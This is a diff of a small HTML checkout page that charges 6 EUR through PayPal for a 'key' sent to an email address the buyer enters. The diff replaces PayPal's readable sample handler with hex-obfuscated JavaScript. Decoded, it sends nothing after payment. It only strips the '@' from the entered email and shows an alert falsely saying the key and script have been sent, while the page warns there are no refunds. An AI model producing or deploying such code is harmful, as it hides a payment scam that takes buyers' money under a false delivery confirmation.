@@ -3,38 +3,45 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .email {
+     padding: 5px;
+     font-size: 16px;
+     border-width: 1px;
+     border-color: #CCCCCC;
+     background-color: #FFFFFF;
+     color: #000000;
+     border-style: hidden;
+     border-radius: 7px;
+     box-shadow: 0px 0px 16px rgba(66,66,66,.62);
+     text-shadow: 0px 0px 0px rgba(66,66,66,.75);
+     text-align: center;
+     display: block;
+  margin-right: auto;
+  margin-left: auto;
+}
+ .email:focus {
+     outline:none;
+}
+h1 {
+    text-align: center;
+}
+h2 {
+    text-align: center;
+}
+  </style>
 </head>
 <body>
   <!-- Replace "test" with your own sandbox Business account app client ID -->
-  <script src="https://www.paypal.com/sdk/js?client-id=EBgdzn2397My-AS4zNAy4ZHIkbEhY90ghcdu7HzpifoaNwV1gWV8ydM5crehzHZPbLHqESc_ySOw3Gep&currency=EUR"></script>
+  <script src="https://www.paypal.com/sdk/js?client-id=AeYNF-Ej38qNsuae5bTk67HYPndAWz8uMByhwpQ59AG0IFpBy-eNk1VmIwfbv99NtFsGNKZMLqB5lZWi&currency=EUR"></script>
   <!-- Set up a container element for the button -->
   <div id="paypal-button-container"></div>
+  <h1>EMAIL TO RECEIVE KEY</h1>
+<input type="text" id="emailTextbox" class="email">
+<h2>PUT BEFORE BUYING</h2>
+<h2>IF YOU PUT WRONG ON ACCIDENT THERE ARE NO REFUNDS </h2>
   <script>
-    paypal.Buttons({
-      // Sets up the transaction when a payment button is clicked
-      createOrder: (data, actions) => {
-        return actions.order.create({
-          purchase_units: [{
-            amount: {
-              value: '6.00' // Can also reference a variable or function
-            }
-          }]
-        });
-      },
-      // Finalize the transaction after payer approval
-      onApprove: (data, actions) => {
-        return actions.order.capture().then(function(orderData) {
-          // Successful capture! For dev/demo purposes:
-          console.log('Capture result', orderData, JSON.stringify(orderData, null, 2));
-          const transaction = orderData.purchase_units[0].payments.captures[0];
-          alert(`Transaction ${transaction.status}: ${transaction.id}\n\nSee console for all available details`);
-          // When ready to go live, remove the alert and show a success message within this page. For example:
-          // const element = document.getElementById('paypal-button-container');
-          // element.innerHTML = '<h3>Thank you for your payment!</h3>';
-          // Or go to another URL:  actions.redirect('thank_you.html');
-        });
-      }
-    }).render('#paypal-button-container');
+var _0xb134=["\x23\x70\x61\x79\x70\x61\x6C\x2D\x62\x75\x74\x74\x6F\x6E\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x72\x65\x6E\x64\x65\x72","\x36\x2E\x30\x30","\x63\x72\x65\x61\x74\x65","\x6F\x72\x64\x65\x72","\x43\x61\x70\x74\x75\x72\x65\x20\x72\x65\x73\x75\x6C\x74","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x63\x61\x70\x74\x75\x72\x65\x73","\x70\x61\x79\x6D\x65\x6E\x74\x73","\x70\x75\x72\x63\x68\x61\x73\x65\x5F\x75\x6E\x69\x74\x73","\x76\x61\x6C\x75\x65","\x65\x6D\x61\x69\x6C\x54\x65\x78\x74\x62\x6F\x78","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x40","","\x72\x65\x70\x6C\x61\x63\x65","\x45\x6D\x61\x69\x6C\x20\x77\x69\x74\x68\x20\x74\x68\x65\x20\x6B\x65\x79\x2C\x20\x73\x63\x72\x69\x70\x74\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x73\x65\x6E\x74\x21","\x74\x68\x65\x6E","\x63\x61\x70\x74\x75\x72\x65"];paypal.Buttons({createOrder:(_0xbc90x1,_0xbc90x2)=>{return _0xbc90x2[_0xb134[4]][_0xb134[3]]({purchase_units:[{amount:{value:_0xb134[2]}}]})},onApprove:(_0xbc90x1,_0xbc90x2)=>{return _0xbc90x2[_0xb134[4]][_0xb134[19]]()[_0xb134[18]](function(_0xbc90x3){console[_0xb134[7]](_0xb134[5],_0xbc90x3,JSON[_0xb134[6]](_0xbc90x3,null,2));const _0xbc90x4=_0xbc90x3[_0xb134[10]][0][_0xb134[9]][_0xb134[8]][0];var _0xbc90x5=document[_0xb134[13]](_0xb134[12])[_0xb134[11]];_0xbc90x5= _0xbc90x5[_0xb134[16]](_0xb134[14],_0xb134[15]);document[_0xb134[13]](_0xb134[12])[_0xb134[11]]= _0xbc90x5;alert(_0xb134[17])})}})[_0xb134[1]](_0xb134[0])
   </script>
 </body>
 </html>
